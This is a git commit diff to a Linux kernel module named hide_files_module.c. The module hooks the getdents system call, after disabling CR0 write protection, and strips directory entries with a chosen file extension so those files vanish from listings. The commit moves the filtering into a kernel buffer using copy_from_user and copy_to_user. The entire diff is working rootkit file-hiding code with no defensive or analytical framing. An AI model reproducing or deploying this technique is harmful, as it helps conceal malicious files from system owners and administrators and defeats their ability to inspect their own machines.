17a528adc20d110ec3eb74b742e8e106ec1638c7
IliyVas <vasiliy.kvm@gmail.com>
2020-04-11 23:47:13 +0300

    Using copy_from_user

--- getdents_kernel_4.13.16/hide_files_module.c
+++ getdents_kernel_4.13.16/hide_files_module.c
@@ -3,6 +3,8 @@
 #include <linux/kernel.h>
 #include <linux/kallsyms.h>
 #include <linux/unistd.h>
+#include <linux/uaccess.h>
+#include <linux/slab.h>
 #include <asm/paravirt.h>
 
 MODULE_LICENSE("GPL");
@@ -29,19 +31,29 @@ inline void enable_write_protect(void) {
     write_cr0(read_cr0() | 0x10000);
 }
 
-asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
-    struct linux_dirent *filtered_dirp, *temp_dirp;
+asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) {
+    struct linux_dirent *filtered_dirp, *last_filtered, *temp_dirp;
     size_t name_len;
-    int bytes_read, remaining_bytes;
+    unsigned long copy_res;
+    int orig_bytes_read, res_bytes_read, remaining_bytes;
 
-    bytes_read = original_getdents(fd, dirp, count);
-    if (bytes_read <= 0) {
-        return bytes_read;
+    orig_bytes_read = original_getdents(fd, dirp, count);
+    if (orig_bytes_read <= 0) {
+        return orig_bytes_read;
     }
 
-    filtered_dirp = dirp;           // Points to the last element of filtered part
-    temp_dirp = dirp;               // Used as iterator to go through all dirp elements
-    remaining_bytes = bytes_read;
+    filtered_dirp = (struct linux_dirent *) kmalloc(orig_bytes_read, GFP_KERNEL);
+    copy_res = copy_from_user(filtered_dirp, dirp, orig_bytes_read);
+    if (copy_res != 0) {
+        printk(KERN_ALERT "Can't copy from user space");
+        kfree(filtered_dirp);
+        return orig_bytes_read;
+    }
+
+    last_filtered = filtered_dirp;           // Points to the last element of filtered part
+    temp_dirp = filtered_dirp;               // Used as iterator to go through all dirp elements
+    remaining_bytes = orig_bytes_read;
+    res_bytes_read = orig_bytes_read;
     while (remaining_bytes > 0) {
         if (temp_dirp->d_reclen <= 0) {
             printk(KERN_ALERT "linux_dirent struct bad size: %hu", temp_dirp->d_reclen);
@@ -50,18 +62,25 @@ asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *dirp, unsigne
 
         name_len = strnlen(temp_dirp->d_name, temp_dirp->d_reclen - DIRENT_PART_SIZE);
         if (strcmp(HIDE_EXT, temp_dirp->d_name + name_len - EXT_LEN) == 0) {
-            bytes_read -= temp_dirp->d_reclen;
+            res_bytes_read -= temp_dirp->d_reclen;
         } else {
-            if (filtered_dirp != temp_dirp) {
-                memcpy(filtered_dirp, temp_dirp, temp_dirp->d_reclen);
+            if (last_filtered != temp_dirp) {
+                memcpy(last_filtered, temp_dirp, temp_dirp->d_reclen);
             }
-            filtered_dirp = (struct linux_dirent *) ((char *) filtered_dirp + filtered_dirp->d_reclen);
+            last_filtered = (struct linux_dirent *) ((char *) last_filtered + last_filtered->d_reclen);
         }
         remaining_bytes -= temp_dirp->d_reclen;
         temp_dirp = (struct linux_dirent *) ((char *) temp_dirp + temp_dirp->d_reclen);
     }
 
-    return bytes_read;
+    copy_res = copy_to_user(dirp, filtered_dirp, res_bytes_read);
+    if (copy_res != 0) {
+        printk(KERN_ALERT "Can't copy to user space");
+        res_bytes_read = orig_bytes_read;
+    }
+
+    kfree(filtered_dirp);
+    return res_bytes_read;
 }
 
 static int __init hide_files_init(void) {
